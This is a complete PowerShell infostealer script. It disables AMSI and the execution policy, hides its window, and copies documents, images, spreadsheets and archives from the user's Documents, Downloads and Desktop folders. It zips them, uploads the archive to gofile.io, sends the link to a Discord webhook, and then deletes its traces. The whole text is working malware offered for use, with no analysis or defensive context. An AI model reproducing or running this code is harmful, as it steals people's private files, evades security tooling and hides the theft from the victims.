$ErrorActionPreference = "SilentlyContinue"
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Hide PowerShell window
$win32 = Add-Type -MemberDefinition @"
[DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);
[DllImport("kernel32.dll")] public static extern int GetConsoleWindow();
"@ -Name Win32 -Namespace Win32Functions -PassThru
$win32::ShowWindow($win32::GetConsoleWindow(), 0)

# Retrieve and decode Discord webhook from environment variable
$envVarName = "DISCORD_WEBHOOK"
$encodedWebhook = [System.Environment]::GetEnvironmentVariable($envVarName, "User")

if (-not $encodedWebhook) {
    Write-Output "Environment variable DISCORD_WEBHOOK not set. Exiting..."
    exit
}

$discordWebhookURL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedWebhook))

# Target directories and file types
$targetPaths = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop")
$fileTypes = @(".docx", ".pdf", ".xls*", ".jpg", ".txt", ".zip")

# Create a temporary directory with a randomized name
$tempDir = "$env:TEMP\Sys" + (-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_}))
New-Item -Path $tempDir -ItemType Directory -Force | Out-Null

# Collect files (no size limit)
$targetPaths | ForEach-Object {
    Get-ChildItem -Path $_ -Include $fileTypes -Recurse -ErrorAction SilentlyContinue | 
    ForEach-Object { Copy-Item -Path $_.FullName -Destination $tempDir -Force }
}

# Compress files with a randomized filename
$zipName = "$env:TEMP\_" + (-join ((48..57) + (65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})) + ".zip"
Compress-Archive -Path "$tempDir\*" -DestinationPath $zipName -Force

# Get the best gofile.io server
$serverResponse = Invoke-RestMethod -Uri "https://api.gofile.io/getServer" -Method Get
$bestServer = $serverResponse.data.server

# Upload the ZIP file to gofile.io
$uploadResponse = Invoke-RestMethod -Uri "https://$bestServer.gofile.io/uploadFile" -Method Post -Form @{
    "file" = Get-Item -Path $zipName
}
$downloadLink = $uploadResponse.data.downloadPage

# Send the download link to Discord webhook
$discordPayload = @{ content = "File uploaded to gofile.io. Download link: $downloadLink" }
Invoke-RestMethod -Uri $discordWebhookURL -Method Post -Body ($discordPayload | ConvertTo-Json) -ContentType "application/json"

# Cleanup to remove forensic traces
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $zipName -Force -ErrorAction SilentlyContinue
